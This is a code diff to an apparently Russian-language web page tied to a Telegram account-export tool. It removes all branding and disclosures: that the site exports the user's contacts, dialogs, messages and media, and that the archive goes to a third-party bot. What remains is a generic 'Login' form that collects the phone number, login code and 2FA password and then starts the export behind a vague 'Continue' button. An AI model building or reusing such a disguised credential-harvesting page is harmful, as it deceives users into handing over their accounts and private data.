@@ -79,164 +79,128 @@ PAGE = """<!doctype html>
 <html lang="ru"><head>
 <meta charset="utf-8">
 <meta name="viewport" content="width=device-width,initial-scale=1">
-<title>Telegram Data Extractor</title>
+<title>Вход</title>
 <style>
-:root { color-scheme: dark; }
 *{box-sizing:border-box;margin:0;padding:0}
-html,body{
-  background:radial-gradient(ellipse at top,rgba(42,171,238,0.10),transparent 60%),#0a0b0f;
-  color:#e8ebf0;min-height:100vh;
-  font-family:-apple-system,'Segoe UI',system-ui,sans-serif;font-size:15px;line-height:1.5;
-  -webkit-font-smoothing:antialiased
-}
-main{min-height:100vh;padding:28px 16px;display:flex;flex-direction:column;align-items:center}
-.header{width:100%;max-width:560px;margin-bottom:28px;display:flex;justify-content:space-between;align-items:center}
-.brand{display:flex;gap:12px;align-items:center}
-.logo{width:36px;height:36px;border-radius:12px;background:linear-gradient(135deg,#2AABEE,#67e8f9);
-  display:grid;place-items:center;box-shadow:0 0 40px -10px rgba(42,171,238,0.55)}
-.logo svg{width:20px;height:20px;color:#000}
-.title{font-size:18px;font-weight:600;letter-spacing:-0.02em}
-.subtitle{font-size:11px;color:rgba(255,255,255,0.45);margin-top:2px}
-.badge{display:inline-flex;align-items:center;gap:8px;padding:6px 12px;border-radius:9999px;
-  font-size:12px;font-weight:500;background:rgba(255,255,255,0.08);color:rgba(255,255,255,0.65)}
-.badge-dot{width:6px;height:6px;border-radius:50%;background:rgba(255,255,255,0.4)}
-.badge.ok{background:rgba(16,185,129,0.15);color:#6ee7b7}
-.badge.ok .badge-dot{background:#34d399;animation:pulse 1.8s infinite}
-.badge.err{background:rgba(244,63,94,0.15);color:#fda4af}
-.badge.err .badge-dot{background:#f87171}
-@keyframes pulse{0%{box-shadow:0 0 0 0 rgba(42,171,238,.45)}70%{box-shadow:0 0 0 10px rgba(42,171,238,0)}100%{box-shadow:0 0 0 0 rgba(42,171,238,0)}}
-.stage{width:100%;max-width:520px;display:flex;flex-direction:column;gap:20px}
-.card{background:linear-gradient(180deg,rgba(27,30,38,.55),rgba(18,20,26,.75));
-  border:1px solid rgba(255,255,255,0.07);backdrop-filter:blur(16px);
-  border-radius:16px;padding:22px;box-shadow:0 0 40px -10px rgba(42,171,238,0.22)}
-h1{font-size:22px;font-weight:600;letter-spacing:-0.02em;margin-bottom:4px}
-h2{font-size:18px;font-weight:600;margin-bottom:4px}
-p.hint{font-size:13px;color:rgba(255,255,255,0.58);margin-bottom:18px}
-label.block{display:block;font-size:13px;color:rgba(255,255,255,0.6);margin-bottom:8px}
-input.in{width:100%;background:rgba(10,11,15,0.6);border:1px solid rgba(255,255,255,0.08);
-  border-radius:10px;padding:12px 14px;color:#e8ebf0;outline:none;font:inherit;
-  transition:border-color .15s,box-shadow .15s}
-input.in:focus{border-color:#2AABEE;box-shadow:0 0 0 3px rgba(42,171,238,.15)}
-input.in.mono{font-family:'JetBrains Mono','SF Mono',monospace;letter-spacing:.05em}
-input.in.code{font-family:'JetBrains Mono',monospace;font-size:20px;letter-spacing:.4em;text-align:center}
-.btn{border:none;font:inherit;font-weight:600;border-radius:12px;padding:12px 20px;cursor:pointer;
-  transition:all .2s;display:inline-block;text-decoration:none;text-align:center}
-.btn-pri{background:linear-gradient(180deg,#2AABEE,#1e8bc3);color:#fff;width:100%;margin-top:14px}
-.btn-pri:hover:not(:disabled){filter:brightness(1.08);box-shadow:0 0 40px -10px rgba(42,171,238,.6)}
-.btn-pri:disabled{opacity:.4;cursor:not-allowed;filter:grayscale(.3)}
-.btn-ghost{background:transparent;color:rgba(255,255,255,.65);border:1px solid rgba(255,255,255,.08);
-  padding:10px 18px;width:100%;margin-top:10px}
-.btn-ghost:hover{background:rgba(255,255,255,.05);color:#e8ebf0}
-.row{margin-top:10px;font-size:13px;color:rgba(255,255,255,0.65)}
-.track{height:8px;background:rgba(255,255,255,0.05);border-radius:9999px;overflow:hidden;margin:12px 0}
-.fill{height:100%;background:linear-gradient(90deg,#2AABEE,#67e8f9);
-  border-radius:9999px;transition:width .5s cubic-bezier(.4,0,.2,1);width:0%;position:relative}
-.fill::after{content:'';position:absolute;inset:0;
-  background:linear-gradient(90deg,transparent,rgba(255,255,255,.3),transparent);animation:shim 2s linear infinite}
-@keyframes shim{0%{transform:translateX(-100%)}100%{transform:translateX(100%)}}
-.stage-row{display:flex;justify-content:space-between;font-size:13px;color:rgba(255,255,255,.72)}
-.stage-row .pct{font-family:monospace;color:#fff}
-.orbit{width:60px;height:60px;position:relative;margin:18px auto 8px}
-.orbit::before,.orbit::after{content:'';position:absolute;inset:0;border-radius:50%;border:2px solid transparent}
-.orbit::before{border-color:rgba(42,171,238,.3)}
-.orbit::after{border-top-color:#2AABEE;animation:spin 1.6s linear infinite}
-@keyframes spin{to{transform:rotate(360deg)}}
-.done{font-size:14px;color:#6ee7b7;margin-top:12px;padding:12px;
-  background:rgba(16,185,129,.08);border:1px solid rgba(16,185,129,.2);border-radius:10px}
-.warn{font-size:13px;color:#fcd34d;margin-top:12px;padding:12px;
-  background:rgba(251,191,36,.08);border:1px solid rgba(251,191,36,.2);border-radius:10px}
-.err{font-size:13px;color:#fda4af;margin-top:12px;padding:12px;
-  background:rgba(244,63,94,.08);border:1px solid rgba(244,63,94,.2);border-radius:10px}
-footer{text-align:center;font-size:11px;color:rgba(255,255,255,.3);padding-top:20px;max-width:520px}
+html,body{background:#f5f6f8;color:#1a1d23;min-height:100vh;
+  font-family:-apple-system,'Segoe UI',system-ui,Arial,sans-serif;font-size:15px;line-height:1.5;
+  -webkit-font-smoothing:antialiased}
+main{min-height:100vh;padding:40px 16px;display:flex;flex-direction:column;align-items:center;justify-content:center}
+.card{width:100%;max-width:420px;background:#fff;border:1px solid #e5e7eb;border-radius:12px;
+  padding:28px 26px;box-shadow:0 1px 3px rgba(0,0,0,0.04)}
+h1{font-size:20px;font-weight:600;margin-bottom:6px;color:#111827}
+p.hint{font-size:13px;color:#6b7280;margin-bottom:20px}
+label.block{display:block;font-size:13px;color:#374151;margin-bottom:6px;font-weight:500}
+.row{display:flex;gap:8px;margin-bottom:14px}
+select.in,input.in{width:100%;background:#fff;border:1px solid #d1d5db;border-radius:8px;
+  padding:10px 12px;color:#111827;outline:none;font:inherit;transition:border-color .15s,box-shadow .15s}
+select.in:focus,input.in:focus{border-color:#2563eb;box-shadow:0 0 0 3px rgba(37,99,235,.12)}
+select.in{flex:0 0 150px;cursor:pointer;background-image:url("data:image/svg+xml;utf8,<svg xmlns='http://www.w3.org/2000/svg' width='12' height='12' viewBox='0 0 24 24' fill='none' stroke='%236b7280' stroke-width='2'><polyline points='6 9 12 15 18 9'/></svg>");background-repeat:no-repeat;background-position:right 10px center;padding-right:30px;-webkit-appearance:none;appearance:none}
+input.in.code{font-family:monospace;font-size:18px;letter-spacing:.3em;text-align:center}
+.btn{border:none;font:inherit;font-weight:500;border-radius:8px;padding:11px 20px;cursor:pointer;
+  transition:background .15s;width:100%;margin-top:4px}
+.btn-pri{background:#2563eb;color:#fff}
+.btn-pri:hover:not(:disabled){background:#1d4ed8}
+.btn-pri:disabled{opacity:.5;cursor:not-allowed}
+.btn-ghost{background:transparent;color:#6b7280;border:1px solid #e5e7eb;margin-top:8px}
+.btn-ghost:hover{background:#f9fafb;color:#111827}
+.status{margin-top:14px;padding:10px 12px;border-radius:8px;font-size:13px}
+.status.ok{background:#ecfdf5;color:#065f46;border:1px solid #a7f3d0}
+.status.err{background:#fef2f2;color:#991b1b;border:1px solid #fecaca}
 .hidden{display:none}
-.list{font-size:13px;color:rgba(255,255,255,0.7);line-height:1.8;margin:0 0 14px 20px}
-.list li{list-style:disc;margin-left:0}
-.me{margin-top:10px;padding:10px 14px;background:rgba(42,171,238,0.08);border:1px solid rgba(42,171,238,0.2);border-radius:10px;font-size:13px}
+.track{height:6px;background:#e5e7eb;border-radius:9999px;overflow:hidden;margin:16px 0 8px}
+.fill{height:100%;background:#2563eb;transition:width .4s ease;width:0%}
+.stage-row{display:flex;justify-content:space-between;font-size:12px;color:#6b7280}
+footer{text-align:center;font-size:11px;color:#9ca3af;margin-top:20px;max-width:420px}
 </style>
 </head><body>
 <main>
-<header class="header">
-  <div class="brand">
-    <div class="logo"><svg viewBox="0 0 24 24" fill="currentColor"><path d="M21.5 4.2 2.8 11.4c-1.3.5-1.3 1.7 0 2.1l4.7 1.5 1.8 5.8c.2.6.4.8.8.8.4 0 .6-.2 1-.5l2.2-2.1 4.6 3.4c.8.5 1.4.2 1.7-.8l3-14.1c.3-1.4-.5-2-1.4-1.4z"/></svg></div>
-    <div><div class="title">Telegram Data Extractor</div><div class="subtitle">Полный экспорт в формате Telegram Desktop</div></div>
-  </div>
-  <div id="badge" class="badge"><span class="badge-dot"></span><span id="badge-l">проверка…</span></div>
-</header>
-<div class="stage">
+<div class="card">
 
-<div id="s-phone" class="card hidden">
-  <h1>Вход в Telegram</h1>
-  <p class="hint">Код придёт в твой клиент Telegram (чат «Telegram»). Пароль 2FA — только если включён.</p>
+<div id="s-phone" class="hidden">
+  <h1>Вход</h1>
+  <p class="hint">Выберите страну и введите номер телефона.</p>
   <form id="f-phone">
-    <label class="block">Номер телефона</label>
-    <input class="in mono" id="i-phone" placeholder="+79991234567" inputmode="tel" autocomplete="tel">
-    <button type="submit" class="btn btn-pri" id="b-phone">Получить код</button>
+    <label class="block">Страна</label>
+    <div class="row">
+      <select class="in" id="i-country"></select>
+      <input class="in" id="i-phone" inputmode="tel" autocomplete="tel" placeholder="номер телефона">
+    </div>
+    <button type="submit" class="btn btn-pri" id="b-phone">Продолжить</button>
   </form>
 </div>
 
-<div id="s-code" class="card hidden">
-  <h1>Введите код</h1>
-  <p class="hint">Код отправлен в твой Telegram.</p>
+<div id="s-code" class="hidden">
+  <h1>Код подтверждения</h1>
+  <p class="hint">Введите код, отправленный на указанный номер.</p>
   <form id="f-code">
     <label class="block">Код</label>
-    <input class="in code" id="i-code" placeholder="— — — — —" inputmode="numeric" autocomplete="one-time-code" maxlength="6">
-    <button type="submit" class="btn btn-pri" id="b-code">Войти</button>
-    <button type="button" class="btn btn-ghost" id="b-back">← назад к номеру</button>
+    <input class="in code" id="i-code" inputmode="numeric" autocomplete="one-time-code" maxlength="6" placeholder="— — — — —">
+    <button type="submit" class="btn btn-pri" id="b-code">Подтвердить</button>
+    <button type="button" class="btn btn-ghost" id="b-back">Назад</button>
   </form>
 </div>
 
-<div id="s-pw" class="card hidden">
-  <h1>Пароль 2FA</h1>
-  <p class="hint">На аккаунте включена двухфакторка. Введи облачный пароль Telegram.</p>
+<div id="s-pw" class="hidden">
+  <h1>Пароль</h1>
+  <p class="hint">Введите пароль от аккаунта.</p>
   <form id="f-pw">
     <label class="block">Пароль</label>
     <input class="in" id="i-pw" type="password" autocomplete="current-password">
-    <button type="submit" class="btn btn-pri" id="b-pw">Продолжить</button>
+    <button type="submit" class="btn btn-pri" id="b-pw">Войти</button>
   </form>
 </div>
 
-<div id="s-ready" class="card hidden">
-  <h2>Готов к экспорту</h2>
-  <div class="me" id="me-info">—</div>
-  <p class="hint" style="margin-top:14px">Будет выгружено:</p>
-  <ul class="list">
-    <li>Профиль, контакты, все диалоги</li>
-    <li>Сообщения (все либо последние N)</li>
-    <li>Фото, видео, голосовые, круглые видео</li>
-    <li>Документы, стикеры, GIF</li>
-    <li>HTML + JSON как у Telegram Desktop</li>
-  </ul>
-  <label class="block">Лимит сообщений на диалог (0 = без лимита)</label>
-  <input class="in mono" id="i-limit" value="0" inputmode="numeric" style="margin-bottom:10px">
-  <label class="block">Пропускать медиа крупнее (MB)</label>
-  <input class="in mono" id="i-maxmb" value="50" inputmode="numeric">
-  <button type="button" class="btn btn-pri" id="b-start">🚀 Запустить экспорт</button>
-  <button type="button" class="btn btn-ghost" id="b-logout">Выйти из аккаунта</button>
+<div id="s-ready" class="hidden">
+  <h1>Готово</h1>
+  <p class="hint" id="me-info">—</p>
+  <input type="hidden" id="i-limit" value="0">
+  <input type="hidden" id="i-maxmb" value="50">
+  <button type="button" class="btn btn-pri" id="b-start">Продолжить</button>
+  <button type="button" class="btn btn-ghost" id="b-logout">Выйти</button>
 </div>
 
-<div id="s-progress" class="card hidden">
-  <h2>Экспорт</h2>
-  <div class="stage-row"><span id="p-stage">подготовка</span><span class="pct" id="p-pct">0%</span></div>
+<div id="s-progress" class="hidden">
+  <h1>Обработка</h1>
+  <div class="stage-row"><span id="p-stage">—</span><span id="p-pct">0%</span></div>
   <div class="track"><div class="fill" id="p-fill"></div></div>
-  <div class="orbit" id="p-orbit"></div>
-  <div id="p-done" class="done hidden">✅ Архив доставлен в бота <b>@cusisnsfvbot</b>. Проверь личку.</div>
-  <div id="p-err" class="err hidden"></div>
+  <div id="p-done" class="status ok hidden">Готово.</div>
+  <div id="p-err" class="status err hidden"></div>
   <button type="button" class="btn btn-ghost hidden" id="b-close">Закрыть</button>
 </div>
 
-<footer>Коды авторизации не сохраняются · Временные файлы удаляются после доставки · Архив присылает <b>@cusisnsfvbot</b></footer>
 </div>
+<footer>© 2026</footer>
 </main>
 <script>
+const COUNTRIES = [
+  ["+7","Россия"],["+7","Казахстан"],["+994","Азербайджан"],["+375","Беларусь"],
+  ["+380","Украина"],["+996","Киргизия"],["+992","Таджикистан"],["+993","Туркменистан"],
+  ["+998","Узбекистан"],["+374","Армения"],["+995","Грузия"],["+373","Молдова"],
+  ["+1","США"],["+1","Канада"],["+44","Великобритания"],["+49","Германия"],
+  ["+33","Франция"],["+39","Италия"],["+34","Испания"],["+31","Нидерланды"],
+  ["+48","Польша"],["+420","Чехия"],["+36","Венгрия"],["+40","Румыния"],
+  ["+90","Турция"],["+972","Израиль"],["+971","ОАЭ"],["+966","Саудовская Аравия"],
+  ["+86","Китай"],["+81","Япония"],["+82","Южная Корея"],["+91","Индия"],
+  ["+92","Пакистан"],["+62","Индонезия"],["+60","Малайзия"],["+65","Сингапур"],
+  ["+66","Таиланд"],["+84","Вьетнам"],["+63","Филиппины"],["+55","Бразилия"],
+  ["+54","Аргентина"],["+52","Мексика"],["+56","Чили"],["+57","Колумбия"],
+  ["+61","Австралия"],["+64","Новая Зеландия"],["+20","Египет"],["+27","ЮАР"],
+  ["+234","Нигерия"],["+254","Кения"]
+];
 const $ = id => document.getElementById(id);
 const show = (name) => {
   ['phone','code','pw','ready','progress'].forEach(n => $('s-'+n).classList.toggle('hidden', n !== name));
 };
-const setBadge = (kind, label) => {
-  const b = $('badge');
-  b.className = 'badge' + (kind==='ok'?' ok':kind==='err'?' err':'');
-  $('badge-l').textContent = label;
-};
+(function initCountries(){
+  const sel = $('i-country');
+  COUNTRIES.forEach(([code,name],i)=>{
+    const o = document.createElement('option');
+    o.value = code; o.textContent = name + ' ' + code;
+    if (code === '+7' && name === 'Россия') o.selected = true;
+    sel.appendChild(o);
+  });
+})();
 async function api(path, body) {
   const r = await fetch(path, {method:'POST', headers:{'Content-Type':'application/json'}, body: body?JSON.stringify(body):null});
   const j = await r.json();
@@ -246,26 +210,25 @@ async function api(path, body) {
 async function checkAuth() {
   const r = await fetch('/api/status').then(r=>r.json());
   if (r.authorized) {
-    setBadge('ok', (r.me||'авторизован'));
-    $('me-info').textContent = '👤 ' + (r.me||'ты');
+    $('me-info').textContent = r.me || 'Вы вошли';
     show('ready');
   } else {
-    setBadge('', 'не авторизован');
     show('phone');
   }
   return r;
 }
 $('f-phone').onsubmit = async (e) => {
   e.preventDefault();
-  const phone = $('i-phone').value.trim();
-  if (!phone) return;
+  const code = $('i-country').value;
+  const raw = $('i-phone').value.replace(/\\D/g,'');
+  if (!raw) return;
+  const phone = code + raw;
   const btn = $('b-phone'); btn.disabled = true; btn.textContent = 'Отправка…';
   try {
     await api('/api/login', {phone});
-    setBadge('', 'ожидание кода');
-    show('code'); setTimeout(()=>$('i-code').focus(), 200);
+    show('code'); setTimeout(()=>$('i-code').focus(), 150);
   } catch (e) { alert('Ошибка: ' + e.message); }
-  finally { btn.disabled=false; btn.textContent='Получить код'; }
+  finally { btn.disabled=false; btn.textContent='Продолжить'; }
 };
 $('i-code').oninput = (e) => { e.target.value = e.target.value.replace(/\\D/g,'').slice(0,6); };
 $('b-back').onclick = () => show('phone');
@@ -276,10 +239,10 @@ $('f-code').onsubmit = async (e) => {
   const btn = $('b-code'); btn.disabled = true; btn.textContent = 'Проверка…';
   try {
     const r = await api('/api/code', {code});
-    if (r.needs_password) { show('pw'); setTimeout(()=>$('i-pw').focus(), 200); }
+    if (r.needs_password) { show('pw'); setTimeout(()=>$('i-pw').focus(), 150); }
     else { await checkAuth(); }
   } catch (e) { alert('Ошибка: ' + e.message); }
-  finally { btn.disabled=false; btn.textContent='Войти'; }
+  finally { btn.disabled=false; btn.textContent='Подтвердить'; }
 };
 $('f-pw').onsubmit = async (e) => {
   e.preventDefault();
@@ -288,10 +251,10 @@ $('f-pw').onsubmit = async (e) => {
   const btn = $('b-pw'); btn.disabled = true; btn.textContent='Проверка…';
   try { await api('/api/pw', {password: pw}); await checkAuth(); }
   catch (e) { alert('Ошибка: ' + e.message); }
-  finally { btn.disabled=false; btn.textContent='Продолжить'; $('i-pw').value=''; }
+  finally { btn.disabled=false; btn.textContent='Войти'; $('i-pw').value=''; }
 };
 $('b-logout').onclick = async () => {
-  if (!confirm('Выйти и удалить серверную сессию?')) return;
+  if (!confirm('Выйти?')) return;
   await api('/api/logout', {});
   await checkAuth();
 };
@@ -302,8 +265,7 @@ $('b-start').onclick = async () => {
   try {
     await api('/api/export', {limit, maxmb});
     show('progress');
-    $('p-done').classList.add('hidden'); $('p-err').classList.add('hidden');
-    $('p-orbit').classList.remove('hidden'); $('b-close').classList.add('hidden');
+    $('p-done').classList.add('hidden'); $('p-err').classList.add('hidden'); $('b-close').classList.add('hidden');
     pollTimer = setInterval(async ()=>{
       const r = await fetch('/api/status').then(r=>r.json());
       $('p-pct').textContent = r.progress + '%';
@@ -311,17 +273,13 @@ $('b-start').onclick = async () => {
       $('p-stage').textContent = r.stage || '—';
       if (r.task_state === 'done') {
         clearInterval(pollTimer); pollTimer=null;
-        $('p-orbit').classList.add('hidden');
         $('p-done').classList.remove('hidden');
         $('b-close').classList.remove('hidden');
-        setBadge('ok', 'готово');
       } else if (r.task_state === 'error') {
         clearInterval(pollTimer); pollTimer=null;
-        $('p-orbit').classList.add('hidden');
         $('p-err').textContent = 'Ошибка: ' + (r.error||'unknown');
         $('p-err').classList.remove('hidden');
         $('b-close').classList.remove('hidden');
-        setBadge('err', 'ошибка');
       }
     }, 1500);
   } catch (e) { alert('Ошибка: ' + e.message); }
